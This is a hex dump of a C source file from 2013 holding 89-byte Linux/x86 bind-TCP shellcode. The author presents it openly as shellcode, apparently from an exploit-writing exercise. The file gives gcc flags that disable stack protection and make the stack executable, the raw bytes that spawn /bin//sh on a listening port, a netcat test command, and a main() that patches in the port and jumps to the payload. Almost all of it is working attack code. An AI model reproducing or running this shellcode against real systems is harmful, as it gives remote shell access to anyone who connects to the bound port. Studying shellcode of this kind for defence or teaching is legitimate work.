00000000  2f 2a 0a 0a 20 53 68 65  6c 6c 20 42 69 6e 64 20  |/*.. Shell Bind |
00000010  54 43 50 20 28 47 65 74  50 43 2f 43 61 6c 6c 2f  |TCP (GetPC/Call/|
00000020  52 65 74 20 4d 65 74 68  6f 64 29 20 2d 20 43 20  |Ret Method) - C |
00000030  4c 61 6e 67 75 61 67 65  0a 20 4c 69 6e 75 78 2f  |Language. Linux/|
00000040  78 38 36 0a 0a 20 57 72  69 74 74 65 6e 20 69 6e  |x86.. Written in|
00000050  20 32 30 31 33 20 62 79  20 47 65 79 73 6c 61 6e  | 2013 by Geyslan|
00000060  20 47 2e 20 42 65 6d 2c  20 48 61 63 6b 69 6e 67  | G. Bem, Hacking|
00000070  20 62 69 74 73 0a 0a 20  20 20 68 74 74 70 3a 2f  | bits..   http:/|
00000080  2f 68 61 63 6b 69 6e 67  62 69 74 73 2e 63 6f 6d  |/hackingbits.com|
00000090  0a 20 20 20 67 65 79 73  6c 61 6e 40 67 6d 61 69  |.   geyslan@gmai|
000000a0  6c 2e 63 6f 6d 0a 0a 20  54 68 69 73 20 73 6f 75  |l.com.. This sou|
000000b0  72 63 65 20 69 73 20 6c  69 63 65 6e 73 65 64 20  |rce is licensed |
000000c0  75 6e 64 65 72 20 74 68  65 20 43 72 65 61 74 69  |under the Creati|
000000d0  76 65 20 43 6f 6d 6d 6f  6e 73 0a 20 41 74 74 72  |ve Commons. Attr|
000000e0  69 62 75 74 69 6f 6e 2d  53 68 61 72 65 41 6c 69  |ibution-ShareAli|
000000f0  6b 65 20 33 2e 30 20 42  72 61 7a 69 6c 20 4c 69  |ke 3.0 Brazil Li|
00000100  63 65 6e 73 65 2e 0a 0a  20 54 6f 20 76 69 65 77  |cense... To view|
00000110  20 61 20 63 6f 70 79 20  6f 66 20 74 68 69 73 20  | a copy of this |
00000120  6c 69 63 65 6e 73 65 2c  20 76 69 73 69 74 0a 0a  |license, visit..|
00000130  20 20 20 68 74 74 70 3a  2f 2f 63 72 65 61 74 69  |   http://creati|
00000140  76 65 63 6f 6d 6d 6f 6e  73 2e 6f 72 67 2f 6c 69  |vecommons.org/li|
00000150  63 65 6e 73 65 73 2f 62  79 2d 73 61 2f 33 2e 30  |censes/by-sa/3.0|
00000160  2f 0a 0a 20 59 6f 75 20  61 72 65 20 66 72 65 65  |/.. You are free|
00000170  3a 0a 0a 20 20 20 20 74  6f 20 53 68 61 72 65 20  |:..    to Share |
00000180  2d 20 74 6f 20 63 6f 70  79 2c 20 64 69 73 74 72  |- to copy, distr|
00000190  69 62 75 74 65 20 61 6e  64 20 74 72 61 6e 73 6d  |ibute and transm|
000001a0  69 74 20 74 68 65 20 77  6f 72 6b 0a 20 20 20 20  |it the work.    |
000001b0  74 6f 20 52 65 6d 69 78  20 2d 20 74 6f 20 61 64  |to Remix - to ad|
000001c0  61 70 74 20 74 68 65 20  77 6f 72 6b 0a 20 20 20  |apt the work.   |
000001d0  20 74 6f 20 6d 61 6b 65  20 63 6f 6d 6d 65 72 63  | to make commerc|
000001e0  69 61 6c 20 75 73 65 20  6f 66 20 74 68 65 20 77  |ial use of the w|
000001f0  6f 72 6b 0a 0a 20 55 6e  64 65 72 20 74 68 65 20  |ork.. Under the |
00000200  66 6f 6c 6c 6f 77 69 6e  67 20 63 6f 6e 64 69 74  |following condit|
00000210  69 6f 6e 73 3a 0a 20 20  20 41 74 74 72 69 62 75  |ions:.   Attribu|
00000220  74 69 6f 6e 20 2d 20 59  6f 75 20 6d 75 73 74 20  |tion - You must |
00000230  61 74 74 72 69 62 75 74  65 20 74 68 65 20 77 6f  |attribute the wo|
00000240  72 6b 20 69 6e 20 74 68  65 20 6d 61 6e 6e 65 72  |rk in the manner|
00000250  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |.               |
00000260  20 20 73 70 65 63 69 66  69 65 64 20 62 79 20 74  |  specified by t|
00000270  68 65 20 61 75 74 68 6f  72 20 6f 72 20 6c 69 63  |he author or lic|
00000280  65 6e 73 6f 72 20 28 62  75 74 0a 20 20 20 20 20  |ensor (but.     |
00000290  20 20 20 20 20 20 20 20  20 20 20 20 6e 6f 74 20  |            not |
000002a0  69 6e 20 61 6e 79 20 77  61 79 20 74 68 61 74 20  |in any way that |
000002b0  73 75 67 67 65 73 74 73  20 74 68 61 74 20 74 68  |suggests that th|
000002c0  65 79 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |ey.             |
000002d0  20 20 20 20 65 6e 64 6f  72 73 65 20 79 6f 75 20  |    endorse you |
000002e0  6f 72 20 79 6f 75 72 20  75 73 65 20 6f 66 20 74  |or your use of t|
000002f0  68 65 20 77 6f 72 6b 29  2e 0a 0a 20 20 20 53 68  |he work)...   Sh|
00000300  61 72 65 20 41 6c 69 6b  65 20 2d 20 49 66 20 79  |are Alike - If y|
00000310  6f 75 20 61 6c 74 65 72  2c 20 74 72 61 6e 73 66  |ou alter, transf|
00000320  6f 72 6d 2c 20 6f 72 20  62 75 69 6c 64 20 75 70  |orm, or build up|
00000330  6f 6e 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |on.             |
00000340  20 20 20 20 74 68 69 73  20 77 6f 72 6b 2c 20 79  |    this work, y|
00000350  6f 75 20 6d 61 79 20 64  69 73 74 72 69 62 75 74  |ou may distribut|
00000360  65 20 74 68 65 0a 20 20  20 20 20 20 20 20 20 20  |e the.          |
00000370  20 20 20 20 20 20 20 72  65 73 75 6c 74 69 6e 67  |       resulting|
00000380  20 77 6f 72 6b 20 6f 6e  6c 79 20 75 6e 64 65 72  | work only under|
00000390  20 74 68 65 20 73 61 6d  65 20 6f 72 0a 20 20 20  | the same or.   |
000003a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 73 69  |              si|
000003b0  6d 69 6c 61 72 20 6c 69  63 65 6e 73 65 20 74 6f  |milar license to|
000003c0  20 74 68 69 73 20 6f 6e  65 2e 0a 0a 2a 2f 0a 0a  | this one...*/..|
000003d0  2f 2a 0a 0a 20 73 68 65  6c 6c 5f 62 69 6e 64 5f  |/*.. shell_bind_|
000003e0  74 63 70 5f 67 65 74 70  63 5f 73 68 65 6c 6c 63  |tcp_getpc_shellc|
000003f0  6f 64 65 0a 0a 20 2a 20  38 39 20 62 79 74 65 73  |ode.. * 89 bytes|
00000400  0a 20 2a 20 6e 75 6c 6c  2d 62 79 74 65 73 20 66  |. * null-bytes f|
00000410  72 65 65 0a 20 2a 20 75  73 65 73 20 47 65 74 50  |ree. * uses GetP|
00000420  43 20 6d 65 74 68 6f 64  20 66 6f 72 20 66 75 6e  |C method for fun|
00000430  20 61 6e 64 20 70 72 6f  66 69 74 0a 0a 0a 20 23  | and profit... #|
00000440  20 67 63 63 20 2d 6d 33  32 20 2d 66 6e 6f 2d 73  | gcc -m32 -fno-s|
00000450  74 61 63 6b 2d 70 72 6f  74 65 63 74 6f 72 20 2d  |tack-protector -|
00000460  7a 20 65 78 65 63 73 74  61 63 6b 20 73 68 65 6c  |z execstack shel|
00000470  6c 5f 62 69 6e 64 5f 74  63 70 5f 67 65 74 70 63  |l_bind_tcp_getpc|
00000480  5f 73 68 65 6c 6c 63 6f  64 65 2e 63 20 2d 6f 20  |_shellcode.c -o |
00000490  73 68 65 6c 6c 5f 62 69  6e 64 5f 74 63 70 5f 67  |shell_bind_tcp_g|
000004a0  65 74 70 63 5f 73 68 65  6c 6c 63 6f 64 65 0a 20  |etpc_shellcode. |
000004b0  23 20 2e 2f 73 68 65 6c  6c 5f 62 69 6e 64 5f 74  |# ./shell_bind_t|
000004c0  63 70 5f 67 65 74 70 63  5f 73 68 65 6c 6c 63 6f  |cp_getpc_shellco|
000004d0  64 65 0a 0a 20 54 65 73  74 69 6e 67 0a 20 23 20  |de.. Testing. # |
000004e0  6e 63 20 31 32 37 2e 30  2e 30 2e 31 20 31 31 31  |nc 127.0.0.1 111|
000004f0  31 31 0a 0a 2a 2f 0a 0a  0a 23 69 6e 63 6c 75 64  |11..*/...#includ|
00000500  65 20 3c 73 74 64 69 6f  2e 68 3e 0a 23 69 6e 63  |e <stdio.h>.#inc|
00000510  6c 75 64 65 20 3c 73 74  72 69 6e 67 2e 68 3e 0a  |lude <string.h>.|
00000520  0a 75 6e 73 69 67 6e 65  64 20 63 68 61 72 20 63  |.unsigned char c|
00000530  6f 64 65 5b 5d 20 3d 20  5c 0a 0a 22 5c 78 65 38  |ode[] = \.."\xe8|
00000540  5c 78 66 66 5c 78 66 66  5c 78 66 66 5c 78 66 66  |\xff\xff\xff\xff|
00000550  5c 78 63 33 5c 78 35 64  5c 78 38 64 5c 78 36 64  |\xc3\x5d\x8d\x6d|
00000560  5c 78 34 61 5c 78 33 31  5c 78 63 30 22 0a 22 5c  |\x4a\x31\xc0"."\|
00000570  78 39 39 5c 78 36 61 5c  78 30 31 5c 78 35 62 5c  |x99\x6a\x01\x5b\|
00000580  78 35 32 5c 78 35 33 5c  78 36 61 5c 78 30 32 5c  |x52\x53\x6a\x02\|
00000590  78 66 66 5c 78 64 35 5c  78 39 36 5c 78 35 62 22  |xff\xd5\x96\x5b"|
000005a0  0a 22 5c 78 35 32 5c 78  36 36 5c 78 36 38 5c 78  |."\x52\x66\x68\x|
000005b0  32 62 5c 78 36 37 5c 78  36 36 5c 78 35 33 5c 78  |2b\x67\x66\x53\x|
000005c0  38 39 5c 78 65 31 5c 78  36 61 5c 78 31 30 5c 78  |89\xe1\x6a\x10\x|
000005d0  35 31 22 0a 22 5c 78 35  36 5c 78 66 66 5c 78 64  |51"."\x56\xff\xd|
000005e0  35 5c 78 34 33 5c 78 34  33 5c 78 35 32 5c 78 35  |5\x43\x43\x52\x5|
000005f0  36 5c 78 66 66 5c 78 64  35 5c 78 34 33 5c 78 35  |6\xff\xd5\x43\x5|
00000600  32 5c 78 35 32 22 0a 22  5c 78 35 36 5c 78 66 66  |2\x52"."\x56\xff|
00000610  5c 78 64 35 5c 78 39 33  5c 78 35 39 5c 78 62 30  |\xd5\x93\x59\xb0|
00000620  5c 78 33 66 5c 78 63 64  5c 78 38 30 5c 78 34 39  |\x3f\xcd\x80\x49|
00000630  5c 78 37 39 5c 78 66 39  22 0a 22 5c 78 62 30 5c  |\x79\xf9"."\xb0\|
00000640  78 30 62 5c 78 35 32 5c  78 36 38 5c 78 32 66 5c  |x0b\x52\x68\x2f\|
00000650  78 32 66 5c 78 37 33 5c  78 36 38 5c 78 36 38 5c  |x2f\x73\x68\x68\|
00000660  78 32 66 5c 78 36 32 5c  78 36 39 22 0a 22 5c 78  |x2f\x62\x69"."\x|
00000670  36 65 5c 78 38 39 5c 78  65 33 5c 78 35 32 5c 78  |6e\x89\xe3\x52\x|
00000680  35 33 5c 78 65 62 5c 78  30 34 5c 78 35 66 5c 78  |53\xeb\x04\x5f\x|
00000690  36 61 5c 78 36 36 5c 78  35 38 5c 78 38 39 22 0a  |6a\x66\x58\x89".|
000006a0  22 5c 78 65 31 5c 78 63  64 5c 78 38 30 5c 78 35  |"\xe1\xcd\x80\x5|
000006b0  37 5c 78 63 33 22 3b 0a  0a 6d 61 69 6e 20 28 29  |7\xc3";..main ()|
000006c0  0a 7b 0a 0a 20 20 20 20  20 20 20 20 2f 2f 20 57  |.{..        // W|
000006d0  68 65 6e 20 74 68 65 20  49 50 20 63 6f 6e 74 61  |hen the IP conta|
000006e0  69 6e 73 20 6e 75 6c 6c  2d 62 79 74 65 73 2c 20  |ins null-bytes, |
000006f0  70 72 69 6e 74 66 20 77  69 6c 6c 20 73 68 6f 77  |printf will show|
00000700  20 61 20 77 72 6f 6e 67  20 73 68 65 6c 6c 63 6f  | a wrong shellco|
00000710  64 65 20 6c 65 6e 67 74  68 2e 0a 0a 09 70 72 69  |de length....pri|
00000720  6e 74 66 28 22 53 68 65  6c 6c 63 6f 64 65 20 4c  |ntf("Shellcode L|
00000730  65 6e 67 74 68 3a 20 20  25 64 5c 6e 22 2c 20 73  |ength:  %d\n", s|
00000740  74 72 6c 65 6e 28 63 6f  64 65 29 29 3b 0a 0a 09  |trlen(code));...|
00000750  2f 2f 20 50 6f 6c 6c 75  74 65 73 20 61 6c 6c 20  |// Pollutes all |
00000760  72 65 67 69 73 74 65 72  73 20 65 6e 73 75 72 69  |registers ensuri|
00000770  6e 67 20 74 68 61 74 20  74 68 65 20 73 68 65 6c  |ng that the shel|
00000780  6c 63 6f 64 65 20 72 75  6e 73 20 69 6e 20 61 6e  |lcode runs in an|
00000790  79 20 63 69 72 63 75 6d  73 74 61 6e 63 65 2e 0a  |y circumstance..|
000007a0  0a 09 5f 5f 61 73 6d 5f  5f 20 28 22 6d 6f 76 6c  |..__asm__ ("movl|
000007b0  20 24 30 78 66 66 66 66  66 66 66 66 2c 20 25 65  | $0xffffffff, %e|
000007c0  61 78 5c 6e 5c 74 22 0a  09 09 20 22 6d 6f 76 6c  |ax\n\t"... "movl|
000007d0  20 25 65 61 78 2c 20 25  65 62 78 5c 6e 5c 74 22  | %eax, %ebx\n\t"|
000007e0  0a 09 09 20 22 6d 6f 76  6c 20 25 65 61 78 2c 20  |... "movl %eax, |
000007f0  25 65 63 78 5c 6e 5c 74  22 0a 09 09 20 22 6d 6f  |%ecx\n\t"... "mo|
00000800  76 6c 20 25 65 61 78 2c  20 25 65 64 78 5c 6e 5c  |vl %eax, %edx\n\|
00000810  74 22 0a 09 09 20 22 6d  6f 76 6c 20 25 65 61 78  |t"... "movl %eax|
00000820  2c 20 25 65 73 69 5c 6e  5c 74 22 0a 09 09 20 22  |, %esi\n\t"... "|
00000830  6d 6f 76 6c 20 25 65 61  78 2c 20 25 65 64 69 5c  |movl %eax, %edi\|
00000840  6e 5c 74 22 0a 09 09 20  22 6d 6f 76 6c 20 25 65  |n\t"... "movl %e|
00000850  61 78 2c 20 25 65 62 70  22 29 3b 0a 0a 0a 09 2f  |ax, %ebp");..../|
00000860  2f 20 53 65 74 74 69 6e  67 20 74 68 65 20 70 6f  |/ Setting the po|
00000870  72 74 20 6e 75 6d 62 65  72 20 28 62 79 74 65 20  |rt number (byte |
00000880  72 65 76 65 72 73 65 20  6f 72 64 65 72 29 20 61  |reverse order) a|
00000890  6e 64 20 43 61 6c 6c 69  6e 67 20 74 68 65 20 73  |nd Calling the s|
000008a0  68 65 6c 6c 63 6f 64 65  0a 0a 09 5f 5f 61 73 6d  |hellcode...__asm|
000008b0  5f 5f 20 28 22 6d 6f 76  77 20 24 30 78 36 37 32  |__ ("movw $0x672|
000008c0  62 2c 20 28 63 6f 64 65  2b 32 37 29 5c 6e 5c 74  |b, (code+27)\n\t|
000008d0  22 0a 09 09 22 63 61 6c  6c 20 63 6f 64 65 22 29  |"..."call code")|
000008e0  3b 0a 09 0a 7d                                    |;...}|
000008e5
